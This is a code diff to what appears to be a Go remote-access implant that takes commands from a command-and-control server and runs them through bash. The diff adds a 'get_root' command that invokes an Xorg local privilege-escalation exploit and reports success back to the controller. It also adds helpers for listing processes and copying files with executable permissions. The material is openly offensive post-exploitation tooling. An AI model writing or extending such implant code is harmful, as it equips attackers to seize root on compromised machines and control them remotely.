@@ -18,6 +18,7 @@ import (
 	"strings"
 	"time"
 
+	gops "github.com/mitchellh/go-ps"
 	"github.com/zcalusic/sysinfo"
 )
 
@@ -84,6 +85,17 @@ func processCCData(data *TunData) {
 			goto send
 		}
 
+		// get_root
+		if cmdSlice[0] == "get_root" {
+			err = GetRoot()
+			out = fmt.Sprintf("Xorg LPE exploit failed:\n%v", err)
+			if err == nil {
+				out = "Got root!"
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
 		cmd := exec.Command("bash", "-c", strings.Join(cmdSlice, " "))
 		outCombined, err = cmd.CombinedOutput()
@@ -131,6 +143,28 @@ send:
 	}
 }
 
+// IsProcAlive check if a process name exists, returns its PID
+func IsProcAlive(procName string) (alive bool, procs []*os.Process) {
+	allprocs, err := gops.Processes()
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	for _, p := range allprocs {
+		if p.Executable() == procName {
+			alive = true
+			proc, err := os.FindProcess(p.Pid())
+			if err != nil {
+				log.Println(err)
+			}
+			procs = append(procs, proc)
+		}
+	}
+
+	return
+}
+
 // Send2CC send TunData to CC
 func Send2CC(data *TunData) error {
 	var out = json.NewEncoder(CCConn)
@@ -166,6 +200,15 @@ func Download(url, path string) (err error) {
 	}
 
 	return ioutil.WriteFile(path, data, 0600)
+}
+
+// Copy copy file from src to dst
+func Copy(src, dst string) error {
+	in, err := ioutil.ReadFile(src)
+	if err != nil {
+		return err
+	}
+	return ioutil.WriteFile(dst, in, 0755)
 }
 
 // GetKernelVersion uname -r
